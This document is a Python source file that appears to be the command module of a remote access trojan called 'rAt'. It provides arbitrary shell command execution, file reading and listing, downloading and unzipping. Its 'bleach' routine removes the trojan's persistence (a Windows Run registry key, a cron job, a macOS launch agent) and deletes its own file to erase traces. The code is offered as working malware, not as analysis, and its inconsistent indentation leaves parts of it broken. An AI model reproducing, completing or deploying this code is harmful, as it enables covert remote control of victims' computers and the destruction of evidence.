import datetime
import os
import subprocess
import sys
import urllib.request
import zipfile

def cat(file_path):
	"""[~] read contents of file [~]"""
	if os.path.isfile(file_path):
		try:
			with open(file_path, 'r', encoding='utf-8') as f:
				return f.read(4000)
		except IOError:
			return '[!] permission denied [!]'
	else:
		return '[!] file not found [!]'

def execute(command):
	"""[*] execute a system command [*]"""
	try:
		output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
		return output.stdout + output.stderr
	except subprocess.CalledProcessError as e:
		return f'[!] error: {e} [!]'

def ls(path='.'):
	"""[~] list files/directories in path [~]"""
	if os.path.exists(path):
		try:
			return '\n'.join(os.listdir(path))
		except OSError:
			return '[!] permission denied [!]'
	else:
		return '[!] path not found [!]'

def pwd():
	"""[~] show current working directory [~]"""
	return os.getcwd()

def bleach(plat):
	"""[#] bleach mechanism for different platforms [#]"""
	try:
		if plat == 'win':
			import winreg
			run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
			# remove registry entry
			with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
				winreg.DeleteValue(reg_key, 'ra') # assumes 'ra' is the registry key name for rAt
			pass
    	elif plat in ('nix', 'mac'):
    		# examples, not fully functional yet
    		if plat == 'nix':
    			os.system('crontab -l | grep -v "rAt_cron_job" | crontab -') # remove specific cronjob
    		elif plat == 'mac':
    			os.system('launchctl remove rAt_launch_agent') # remove launch agent

    		os.remove('path/rAt') # replace later with path when clear
    		pass

    	# delete rAt
    	os.remove(sys.argv[0])
    	sys.exit(0)

    except Exception as e:
    	return f'[!] bleach error: {e} [!]'

    # if success
    return '[+] bleach successful [+]'

def unzip(f):
	"""[;;] unzip file [;;]"""
	if os.path.isfile(f):
		try:
			with zipfile.ZipFile(f, 'r') as zf:
				zf.extractall()
				return f'[+] file {f} extracted [+]'
		except zipfile.BadZipfile:
			return '[!] failed to unzip file [!]'
	else:
		return '[!] file not found [!]'

def wget(url):
	"""[><] download file from URL [><]"""
	if not url.startswith('http://') and not url.startswith('https://'):
		return '[!] URL must begin with http:// or https:// [!]'

	fname = url.split('/')[-1] or f'file-{datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")}'

	try:
		urllib.request.urlretrieve(url, fname)
		return f'[+] file {fname} downloaded [+]'
	except IOError:
		return '[!] download failed [!]'